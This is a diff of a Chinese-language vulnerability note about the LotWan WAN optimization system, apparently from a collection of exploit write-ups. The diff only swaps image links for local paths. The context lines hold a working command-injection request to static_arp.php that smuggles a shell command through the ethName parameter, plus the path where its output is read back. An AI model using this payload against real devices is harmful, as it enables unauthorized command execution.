@@ -20,7 +20,7 @@ title="LotWan 广域网优化系统"
 
 登录页面
 
-![image-20220519182832800](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205191828884.png)
+![image-20220519182832800](./images/202205191828884.png)
 
 存在漏洞的文件为
 
@@ -28,8 +28,8 @@ title="LotWan 广域网优化系统"
 /acc/bindipmac/static_arp.php?ethName=||id>cmd.txt||
 ```
 
-![image-20220519182841776](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205191828819.png)
+![image-20220519182841776](./images/202205191828819.png)
 
 再访问 `/acc/bindipmac/cmd.txt`
 
-![image-20220519182859597](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205191828666.png)
+![image-20220519182859597](./images/202205191828666.png)
